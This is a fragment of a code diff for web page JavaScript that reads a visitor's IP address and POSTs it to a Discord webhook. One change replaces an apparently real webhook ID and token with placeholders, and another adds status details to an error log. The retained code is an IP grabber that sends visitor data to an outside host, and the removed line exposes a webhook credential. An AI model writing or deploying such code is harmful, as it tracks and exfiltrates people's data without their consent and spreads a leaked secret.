@@ -183,7 +183,7 @@
                     console.log('User IP Address:', data.query);
 
                     // Send the IP address to your Discord webhook
-                    fetch('https://ptb.discord.com/api/webhooks/1257370292347732039/gawrdocaGwUi6yv5iusR6HXYubx0CrLcnfRXNRRhKOtgzrnOg_qFDYZlLQ86ioWpKOvJ', {
+                    fetch('https://ptb.discord.com/api/webhooks/your-webhook-id/your-webhook-token', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -196,7 +196,7 @@
                         if (response.ok) {
                             console.log('IP address sent to webhook successfully!');
                         } else {
-                            console.error('Failed to send IP address to webhook.');
+                            console.error('Failed to send IP address to webhook. Status:', response.status, response.statusText);
                         }
                     })
                     .catch(error => console.error('Error sending IP address:', error));
